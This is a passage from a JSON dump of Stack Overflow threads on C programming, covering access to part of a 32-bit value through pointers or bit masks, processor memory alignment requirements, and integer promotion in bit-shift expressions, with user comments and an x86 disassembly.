"https://stackoverflow.com/questions/36890101/point-to-low-byte-address-of-variable-in-c/36890197#36890197", "title": "point to low byte address of variable in c", "body": "<p>If you just want 16bits of the larger 32bits type, use bit mask for the task, for example, to get the lower 16 bits of value:</p>\n\n<pre><code>long value = 0xFF00f41a;\nlong lower = value &amp; 0xFFFF;\n</code></pre>\n\n<p>To change the lower 16 bits of value, use bit operation:</p>\n\n<pre><code>lower = &lt;some thing new&gt;;\nvalue = (value &amp; 0xFFFF0000) | lower;\n</code></pre>\n\n<p>Don't use pointer to access part of the 32bit value, it crates undefined bahavior when you dereference it.</p>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 3206674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8de1b655160c799a72064a60da72a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "dev.burak", "link": "https://stackoverflow.com/users/3206674/dev-burak"}, "edited": false, "score": 0, "creation_date": 1461762751, "post_id": 36890686, "comment_id": 61346029, "body": "Thanks a lot @Victor Sorokin"}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "edited": false, "score": 0, "creation_date": 1461762949, "post_id": 36890686, "comment_id": 61346204, "body": "You are changing part of the integer via a char pointer. This is the bad C habit."}, {"owner": {"reputation": 3, "user_id": 3206674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8de1b655160c799a72064a60da72a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "dev.burak", "link": "https://stackoverflow.com/users/3206674/dev-burak"}, "edited": false, "score": 0, "creation_date": 1461763088, "post_id": 36890686, "comment_id": 61346327, "body": "why it is bad @flutter"}, {"owner": {"reputation": 11355, "user_id": 162634, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/tpqof.jpg?s=128&g=1", "display_name": "Victor Sorokin", "link": "https://stackoverflow.com/users/162634/victor-sorokin"}, "reply_to_user": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "edited": false, "score": 1, "creation_date": 1461763111, "post_id": 36890686, "comment_id": 61346346, "body": "@fluter according to linked answer, this is well-known to work if int is aligned."}], "tags": [], "owner": {"reputation": 11355, "user_id": 162634, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/tpqof.jpg?s=128&g=1", "display_name": "Victor Sorokin", "link": "https://stackoverflow.com/users/162634/victor-sorokin"}, "is_accepted": true, "score": 1, "last_activity_date": 1461762217, "last_edit_date": 1495540779, "creation_date": 1461762217, "answer_id": 36890686, "question_id": 36890101, "link": "https://stackoverflow.com/questions/36890101/point-to-low-byte-address-of-variable-in-c/36890686#36890686", "title": "point to low byte address of variable in c", "body": "<p>Following short example will work, if <code>int</code> is aligned on 4-bytes (which seems to be guaranteed by <code>gcc</code>, see <a href=\"https://stackoverflow.com/questions/4291048\">Casting an int pointer to a char ptr and vice versa</a>):</p>\n\n<pre><code>#include &lt;stdio.h&gt;                                                                                                                                                                                             \n\nint main() {                                                                                                                                                                                                   \n    int v = 0xcafe;                                                                                                                                                              \n    int *ip = &amp;v;                                                                                                                                                                                              \n    char *cp = (char*) ip;                                                                                                                                                                                     \n\n    printf(\"%hhX\\n\", *cp); // FE on little-endian box                                                                                                                                                                                    \n    printf(\"%hhX\\n\", *(cp + 1));                                                                                                                                                                               \n\n    *cp = 0xbe;                                                                                                                                                                                                \n    *(cp + 1) = 0xba;                                                                                                                                                                                          \n    printf(\"%X\\n\", *ip);                                                                                                                                                                                       \n\n    return 0;                                                                                                                                                                                                  \n}\n</code></pre>\n\n<p>You can guarantee alignment of <code>int</code> thus:</p>\n\n<pre><code>int main() {                                                                                                                                                                                                   \n    __attribute__ ((aligned (4))) int v = 0xcafe;                                              \n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 3206674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8de1b655160c799a72064a60da72a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "dev.burak", "link": "https://stackoverflow.com/users/3206674/dev-burak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 835, "favorite_count": 0, "closed_date": 1461762750, "accepted_answer_id": 36890686, "answer_count": 2, "score": 0, "last_activity_date": 1461762217, "creation_date": 1461760791, "last_edit_date": 1461761249, "question_id": 36890101, "link": "https://stackoverflow.com/questions/36890101/point-to-low-byte-address-of-variable-in-c", "closed_reason": "Needs details or clarity", "title": "point to low byte address of variable in c", "body": "<p>I want to learn if this is possible:</p>\n\n<p>for ex:</p>\n\n<p>we have <strong>long Lvalue = 0xFF00f41a;</strong></p>\n\n<p>and also have <strong>int *p;</strong></p>\n\n<p>Can we point to last 2 byte of Lvalue</p>\n\n<p>like <strong><code>p=&amp;Lvalue &lt;&lt;16;</code></strong></p>\n\n<p><strong>p pointed frist 16 bit value</strong> is it possible?</p>\n\n<pre><code>*p --&gt; f41a;\n*(p+1) ---&gt;0xFF00;\n</code></pre>\n\n<p>then if </p>\n\n<pre><code>p = 0xa011;\n</code></pre>\n\n<p>long Lvalue ---> 0xFF00a011</p>\n\n<p>actually I need bit operations. I have 32 bit value but I can send only 16 bits and if I change 16 bit have to change first 16 bit last 16 bit of 32 bit value.</p>\n"}, {"tags": ["c", "embedded", "memory-alignment"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1461760657, "post_id": 36890025, "comment_id": 61344329, "body": "A question about &quot;all hardware, past, future, speculative&quot;, is pretty hard to answer."}, {"owner": {"reputation": 139, "user_id": 851042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dec6d93c74fd80dcaeb6a78aa1e55aaa?s=128&d=identicon&r=PG", "display_name": "efox29", "link": "https://stackoverflow.com/users/851042/efox29"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1461760895, "post_id": 36890025, "comment_id": 61344534, "body": "@KerrekSB The jist of what I am asking is for is really, where can I find the information for any device if all 32 bit processors arent aligned the same. Is it in the manual ? If so, what is the correct terms or terminology to search for and where ? Does that clear things ups ?"}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461760952, "post_id": 36890025, "comment_id": 61344578, "body": "Pretty hard? I would vouch for impossible. It&#39;s hardware and implementation dependent. x86, for example, does allow any arbitrarily aligned reads / writes, a compiler is free to do whatever it likes to do. ARM, on the other hand, does not allow arbitrarily aligned accesses."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461760999, "post_id": 36890025, "comment_id": 61344613, "body": "A 16-bit processor won&#39;t require a 32-bit variable to align with a 4-divisible address, since it will be manipulated as 2 16-bit quantities."}, {"owner": {"reputation": 4011, "user_id": 1477064, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/cd12123a743db34ac0b055a6fa736788?s=128&d=identicon&r=PG", "display_name": "xvan", "link": "https://stackoverflow.com/users/1477064/xvan"}, "edited": false, "score": 0, "creation_date": 1461761128, "post_id": 36890025, "comment_id": 61344714, "body": "Alignment depends on how an specific architecture accesses memory. You could say that something is unaligned if it requires more than the minimum amount of instructions to load that data type. What&#39;s the minimum depends on the architecture, so you need to read about how memory is implemented for it."}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1461762040, "post_id": 36890025, "comment_id": 61345452, "body": "It is actually mentioned in the manual you linked.  Quote: &quot;The dsPIC &#174;  DSC device requires that words be aligned on even byte boundaries, so care  must be taken when using the packed attribute to avoid run time addressing errors.&quot;.  It does not appear to cover 32-bit devices."}, {"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 0, "creation_date": 1461764448, "post_id": 36890025, "comment_id": 61347475, "body": "Memory alignment requirements are imposed by the hardware, not the compiler.  Look in the datasheet for the microcontroller or CPU core.  The compiler developers should have followed the hardware requirements so that the compiler automatically pads structs appropriately.  So typically you won&#39;t have to manually insert pad bytes for CPU alignment requirements.  Occasionally you may want to remove the automatic pad bytes (e.g., if the struct is serialized to a file or network message).  Or occasionally you may want to manually align a byte buffer if that buffer will be cast to another type."}, {"owner": {"reputation": 139, "user_id": 851042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dec6d93c74fd80dcaeb6a78aa1e55aaa?s=128&d=identicon&r=PG", "display_name": "efox29", "link": "https://stackoverflow.com/users/851042/efox29"}, "edited": false, "score": 0, "creation_date": 1461771627, "post_id": 36890025, "comment_id": 61353240, "body": "I am not entirely too sure why this question was put on hold - I made an assumption about 32 bit alignment, and if I was wrong - where can I find the information if its device dependent and for more information, I am asking what terms can I look up. The answer to these questions should be pretty straightforward. Yes/No you can or cant assume that. You find the information in the datasheet/compiler manual - look under alignment or boundary etc... This is called address alignment if you want to find additional references...etc...&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1461765239, "last_edit_date": 1461765239, "creation_date": 1461764912, "answer_id": 36891778, "question_id": 36890025, "link": "https://stackoverflow.com/questions/36890025/where-can-i-find-what-the-alignment-requirement-for-any-arbitrary-compiler/36891778#36891778", "title": "Where can I find what the alignment requirement for any arbitrary compiler?", "body": "<p>Alignments requirements have 2 considerations: required, preferred</p>\n\n<p>Required: Example: some platforms require various types, like an <code>int</code> to be aligned.  Contorted code that attempts to access an <code>int</code> on an unaligned boundary results in a fault.  Compilers will normally aligned data automatically to prevent this issue.</p>\n\n<p>Efficiency: Unaligned accesses may be allowed yet results in slower code.  Many compilers, rather than packing the data, will default to aligned data for <em>speed</em> efficiency.  Typically such compilers allow a compiler specific keyword or compiler option to <em>pack</em> the data instead for <em>space</em> efficiency.</p>\n\n<p>These issues apply to various processors of various sizes in different degrees.  An 8-bit processor may have a 16-bit data bus and oblige 16+ -bit types to be aligned.  A compliant C compiler for a 64-bit processor may have <em>only</em> have 64-bit types, even <code>char</code>.  The possibilities are vast.</p>\n\n<hr>\n\n<p>C provides an integer type <code>max_align_t</code> in <code>&lt;stddef.h&gt;</code>.  This could be used in various ways to determine the minimum general alignment requirement.</p>\n\n<blockquote>\n  <p>... <code>max_align_t</code> which is an object type whose alignment is as great as is supported by the implementation in <strong>all</strong> contexts; ...  C11 \u00a77.19 2</p>\n</blockquote>\n\n<p>C also has <code>_Alignas()</code> to impose stricter alignment of a variable.</p>\n"}, {"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1461768077, "post_id": 36892381, "comment_id": 61350465, "body": "&quot;Yes, all processors have an alignment penalty of some sort&quot; This isn&#39;t correct, since the vast majority of all 8 bit microcontrollers have no alignment penalties at all, for obvious reasons. And there are plenty of 16 bit ones that don&#39;t either."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1461770487, "post_id": 36892381, "comment_id": 61352398, "body": "fair enough, if the possible transfers are larger than the size of the buses, or alignment can push you into multiple cycles for one transfer, then there is a penalty.  yes there are 8 bit and some 16s without a penalty due to alignment."}], "tags": [], "owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "is_accepted": false, "score": 1, "last_activity_date": 1461766326, "creation_date": 1461766326, "answer_id": 36892381, "question_id": 36890025, "link": "https://stackoverflow.com/questions/36890025/where-can-i-find-what-the-alignment-requirement-for-any-arbitrary-compiler/36892381#36892381", "title": "Where can I find what the alignment requirement for any arbitrary compiler?", "body": "<p>There are two global answers here.  Yes, all processors have an alignment penalty of some sort (ARM, MIPS, x86, etc).  No you cannot determine by type.  All ARMs do not have the same alignment penalty, despite what folks think they know about the older ARMv4 and ARMv5, you could do unaligned accesses in a predictable way, that predictable way was not what most of us would have preferred, and you have to enable it.  MIPS and ARMs and perhaps others at one point would have a severe punishment for unaligned transfers, you would get a data fault.  But due to the nature of how programmers program, etc, the default at least for ARM is to have that disabled on some/newer cores.  You can disable it or enable it whichever way you want.   </p>\n\n<p>ALL processors have a penalty for unaligned transfers, a performance penalty, and those hits happen at the various layers, sometimes in the core, at the edge of the core, on each cache layer, and at the outer layer of ram.  Since the designs vary so widely you cannot come up with a single rule.  </p>\n\n<p>Likewise since alignment in compilers is implementation defined, you cant write portable code.  So if you are dealing with a processor (likely an ARM since that is where most folks get bitten) that has unaligned faults enabled, the most portable solution, but not foolproof, is to start your structs with the 64 bit variables, then the 32 then the 16 then the 8.  Compilers tend to place things in the order that you defined them, so long as the whole struct starts on the right boundary for that target, then the variables will fall into alignment properly, no padding required.  There is no global solution to the problem other than dont use structs, or disable alignment checking and suffer the front end performance hits.</p>\n\n<p>Note that the 32 bit arms we generally deal with today use a 64 bit AMBA/AXI bus not 32, they still can check all the alignments (16, 32, 64) for transfers if enabled, but the unaligned performance hits at least at the AMBA/AXI level dont hit you unless you cross the 64 bit aligned boundary.  You may still have an extra cache line hit, although that is unlikely if you dont have an AMBA/AXI hit.</p>\n"}], "owner": {"reputation": 139, "user_id": 851042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dec6d93c74fd80dcaeb6a78aa1e55aaa?s=128&d=identicon&r=PG", "display_name": "efox29", "link": "https://stackoverflow.com/users/851042/efox29"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 275, "favorite_count": 0, "closed_date": 1461768114, "answer_count": 2, "score": 0, "last_activity_date": 1461766326, "creation_date": 1461760588, "last_edit_date": 1461763540, "question_id": 36890025, "link": "https://stackoverflow.com/questions/36890025/where-can-i-find-what-the-alignment-requirement-for-any-arbitrary-compiler", "closed_reason": "Needs more focus", "title": "Where can I find what the alignment requirement for any arbitrary compiler?", "body": "<p>I came across this page <a href=\"http://www.catb.org/esr/structure-packing/\" rel=\"nofollow\">The Lost Art of C Structure Packing</a> and while I have never had to actually pad any structs, I'd like to learn a bit more so that when/if I need too - I can.</p>\n\n<p>It says:</p>\n\n<blockquote>\n  <p>Storage for the basic C datatypes on an x86 or ARM processor doesn\u2019t normally start at arbitrary byte addresses in memory. Rather, each type except char has an alignment requirement; chars can start on any byte address, but 2-byte shorts must start on an even address, 4-byte ints or floats must start on an address divisible by 4, and 8-byte longs or doubles must start on an address divisible by 8. Signed or unsigned makes no difference.</p>\n</blockquote>\n\n<p>Does this imply that all 32 bit processors (x86, ARM, AVR32, PIC32,...) have this alignment requirement? What about 16 bit processors? </p>\n\n<p>If not, and it is device specific, where can I find this information? \nI tried searching through <a href=\"http://ww1.microchip.com/downloads/en/DeviceDoc/50002071E.pdf\" rel=\"nofollow\">Microchip XC16 Manual</a> but I could not find the alignment requirements that say that ints start at addresses divisible by 4.</p>\n\n<p>I assume that the information is there, and I am not searching for the right key words - what is the \"alignment requirement\" called if I were to search online for more information? </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461760439, "post_id": 36889885, "comment_id": 61344146, "body": "No, they <i>should</i> not. Implementation defined behaviour. Not enough information given. Have a look at the Assembler output."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461760502, "post_id": 36889885, "comment_id": 61344194, "body": "&#39;a and b should be equal&#39; why?  The code is different."}, {"owner": {"reputation": 4332, "user_id": 1517244, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/69e56ba57db6774aa70eca1d8d5684aa?s=128&d=identicon&r=PG", "display_name": "Jimbo", "link": "https://stackoverflow.com/users/1517244/jimbo"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461760507, "post_id": 36889885, "comment_id": 61344202, "body": "@Olaf : Why is it implementation defiend? A right shift of an unsigned integer is fine surely? If it was signed, it would be UB..."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 4332, "user_id": 1517244, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/69e56ba57db6774aa70eca1d8d5684aa?s=128&d=identicon&r=PG", "display_name": "Jimbo", "link": "https://stackoverflow.com/users/1517244/jimbo"}, "edited": false, "score": 1, "creation_date": 1461760541, "post_id": 36889885, "comment_id": 61344243, "body": "@Jimbo: The shifts are <b>not</b> on unsigned integers, but <code>int</code>!"}, {"owner": {"reputation": 4332, "user_id": 1517244, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/69e56ba57db6774aa70eca1d8d5684aa?s=128&d=identicon&r=PG", "display_name": "Jimbo", "link": "https://stackoverflow.com/users/1517244/jimbo"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461760583, "post_id": 36889885, "comment_id": 61344282, "body": "@Olaf... ah I see... they are promoted to int... doh!"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461760734, "post_id": 36889885, "comment_id": 61344404, "body": "Enable compiler warnings, especially conversion/truncation warnings. A good compiler like gcc will complain."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 4332, "user_id": 1517244, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/69e56ba57db6774aa70eca1d8d5684aa?s=128&d=identicon&r=PG", "display_name": "Jimbo", "link": "https://stackoverflow.com/users/1517244/jimbo"}, "edited": false, "score": 0, "creation_date": 1461760787, "post_id": 36889885, "comment_id": 61344448, "body": "@Jimbo: Exactly. Welcome to the wonderful world of C integers :-}"}, {"owner": {"reputation": 4332, "user_id": 1517244, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/69e56ba57db6774aa70eca1d8d5684aa?s=128&d=identicon&r=PG", "display_name": "Jimbo", "link": "https://stackoverflow.com/users/1517244/jimbo"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461760893, "post_id": 36889885, "comment_id": 61344533, "body": "@Olaf: Yes... wonderful indeed :) One of those little subtleties that completely slipped my mind :( Thanks to you and Paul R for the clarity :)"}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461760624, "post_id": 36889991, "comment_id": 61344303, "body": "Only for 32 bit <code>int</code> (possible) and only for 2&#39;s complement (likely). Also, not <code>~a</code> is promoted, but <code>a</code>. <code>~</code> is already done on <code>int</code>."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461760659, "post_id": 36889991, "comment_id": 61344333, "body": "Thanks @Olaf - I&#39;ll add a note to this effect."}], "tags": [], "owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "is_accepted": true, "score": 11, "last_activity_date": 1461760690, "last_edit_date": 1461760690, "creation_date": 1461760505, "answer_id": 36889991, "question_id": 36889885, "link": "https://stackoverflow.com/questions/36889885/c-bitshifting-behavior/36889991#36889991", "title": "C bitshifting behavior", "body": "<p>In the first case <code>~a</code> is promoted to <code>int</code>, so you get:</p>\n\n<pre><code>a = 0xffffff00 &gt;&gt; 1 = 0x7fffff80\n</code></pre>\n\n<p>which is truncated to <code>0x80</code>.</p>\n\n<p>In the second case, the truncation happens <em>before</em> the shift, so you get:</p>\n\n<pre><code>b = 0xffffff00\n</code></pre>\n\n<p>which is truncated to <code>0x00</code>, and then shifting this gives a result of <code>0x00</code>.</p>\n\n<p>(Note: the above assumes 32 bit ints, normal 2s complement representation and logical right shifting of signed values.)</p>\n"}], "owner": {"reputation": 2445, "user_id": 3562415, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/34cf4577fdbcbd9ef1fdc64165c5e075?s=128&d=identicon&r=PG&f=1", "display_name": "iCaramba", "link": "https://stackoverflow.com/users/3562415/icaramba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 2, "accepted_answer_id": 36889991, "answer_count": 1, "score": 9, "last_activity_date": 1461760690, "creation_date": 1461760211, "last_edit_date": 1461760516, "question_id": 36889885, "link": "https://stackoverflow.com/questions/36889885/c-bitshifting-behavior", "title": "C bitshifting behavior", "body": "<p>I found this example, can anyone explain what's going on here? I'm using LLVM 7.1.</p>\n\n<pre><code>uint8_t a = 0xff;\na = ~a &gt;&gt; 1;\n// a = 0b1000000\n\nuint8_t b = 0xff;\nb = ~b;\nb = b &gt;&gt; 1;\n//b = 0\n</code></pre>\n\n<p><code>a</code> and <code>b</code> should be equal??</p>\n\n<p>EDIT:\nAdded the disassembly:</p>\n\n<pre><code>testt`main:\n    0x100000f70 &lt;+0&gt;:  pushq  %rbp\n    0x100000f71 &lt;+1&gt;:  movq   %rsp, %rbp\n    0x100000f74 &lt;+4&gt;:  xorl   %eax, %eax\n    0x100000f76 &lt;+6&gt;:  movl   $0x0, -0x4(%rbp)\n    0x100000f7d &lt;+13&gt;: movl   %edi, -0x8(%rbp)\n    0x100000f80 &lt;+16&gt;: movq   %rsi, -0x10(%rbp)\n    0x100000f84 &lt;+20&gt;: movb   $-0x1, -0x11(%rbp)\n    0x100000f88 &lt;+24&gt;: movzbl -0x11(%rbp), %edi\n    0x100000f8c &lt;+28&gt;: xorl   $-0x1, %edi\n    0x100000f8f &lt;+31&gt;: sarl   $0x1, %edi\n    0x100000f92 &lt;+34&gt;: movb   %dil, %cl\n    0x100000f95 &lt;+37&gt;: movb   %cl, -0x11(%rbp)\n    0x100000f98 &lt;+40&gt;: movb   $-0x1, -0x12(%rbp)\n    0x100000f9c &lt;+44&gt;: movzbl -0x12(%rbp), %edi\n    0x100000fa0 &lt;+48&gt;: xorl   $-0x1, %edi\n    0x100000fa3 &lt;+51&gt;: movb   %dil, %cl\n    0x100000fa6 &lt;+54&gt;: movb   %cl, -0x12(%rbp)\n    0x100000fa9 &lt;+57&gt;: movzbl -0x12(%rbp), %edi\n    0x100000fad &lt;+61&gt;: sarl   $0x1, %edi\n    0x100000fb0 &lt;+64&gt;: movb   %dil, %cl\n    0x100000fb3 &lt;+67&gt;: movb   %cl, -0x12(%rbp)\n    0x100000fb6 &lt;+70&gt;: popq   %rbp\n    0x100000fb7 &lt;+71&gt;: retq   \n</code></pre>\n"}, {"tags": ["c", "embedded"], "comments": [{"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 1, "creation_date": 1461760043, "post_id": 36889773, "comment_id": 61343859, "body": "This is due to alignment... This question may helps you <a href=\"http://stackoverflow.com/questions/2271596/question-related-to-alignment\" title=\"question related to alignment\">stackoverflow.com/questions/2271596/&hellip;</a>"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1461764829, "post_id": 36889773, "comment_id": 61347751, "body": "Have you enabled optimizations? If your compiler cannot handle something as simple as global varible placement, it doesn&#39;t sound very good compiler. It&#39;s of course possible, that due to small number of variables, it simply doesn&#39;t care. You should try with big application, and with size optimizations enabled."}, {"owner": {"reputation": 19, "user_id": 6261336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f0aa148c78791b1f37ee14fa91754b5?s=128&d=identicon&r=PG&f=1", "display_name": "user6261336", "link": "https://stackoverflow.com/users/6261336/user6261336"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1461773649, "post_id": 36889773, "comment_id": 61354832, "body": "@user694733: Yes tried with optimizations enabled, but did not help. With big application, we optimized such cases with hand and squeezed quite some juice out of already saturated RAM. So the compiler is dumb for sure. But is there any compiler that does this for global variables? Does gcc do this? If yes, with what option?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1461823639, "post_id": 36889773, "comment_id": 61376343, "body": 